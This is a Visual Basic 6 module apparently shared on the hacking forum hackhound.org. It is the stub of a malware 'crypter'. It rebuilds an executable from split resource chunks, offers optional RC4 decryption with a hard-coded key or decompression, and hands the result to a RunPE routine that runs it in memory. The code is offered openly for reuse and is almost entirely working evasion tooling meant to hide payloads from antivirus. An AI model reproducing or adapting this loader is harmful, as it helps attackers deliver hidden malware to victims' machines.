Attribute VB_Name = "mHaupt"
' Split Example made by sotpot for Ojink and Members of www.hackhound.org
' my english is not so well sry
' also credits to ap0calypse http://hackhound.org/forum/index.php?topic=26579.0 for showing the way portet by sotpot
' also credits for cNtPEL to Karcrack and bcause of that to Cobein for K0n3kD
' if you use this give credits blabla
Option Explicit ' clean code i hope my code is clean lol

Sub Main()
 
 Dim gogo As New Holla
 
    gogo.RunPE fGetFile
    
End Sub

Public Function fGetFile() As Byte()
 
 Dim bFile() As Byte ' Variable for our file
 Dim sFile As String ' Variable for our file as string
 Dim sTempText As String ' Variable for joining parts together
 Dim sCount As String ' Variable to store our the partcount (number of files to join)
 Dim i As Integer
       
       'here we get the number of files
       sCount = StrConv(LoadResData(0, "RCPART"), vbUnicode)
       
        'here we get our file
        sTempText = vbNullString ' clean our variable just to get sure lol
        For i = 0 To sCount - 1 ' here our loop gets startet. starting at 0 to the number provided by sCount - 1 (sCount starts at 1 not at 0)
         sFile = vbNullString ' clean our variable just to get sure lol
         sFile = StrConv(LoadResData(i, "RCDATA"), vbUnicode)
         sTempText = sTempText & sFile ' here we join our files together
        Next i ' next round. if our sCount is not = 0 we go to up to For i = 0 To sCount -1 and start a new round or go down if sCount = 0
        
        
        sFile = vbNullString ' clean our variable just to get sure lol
        sFile = sTempText ' put the joind parts into sFile
        
        'Add your Decryption here
        'sFile = RC4(sFile, "QIfOT87133U") ' if encrypted decrypt file here
                
        bFile = StrConv(sFile, vbFromUnicode) ' convert sFile into a bytearray and put in into bFile
        
        'Or maybe decompress
        'Call DeCompress_Huffman_Dynamic(bFile)
                
    fGetFile = bFile
        
End Function

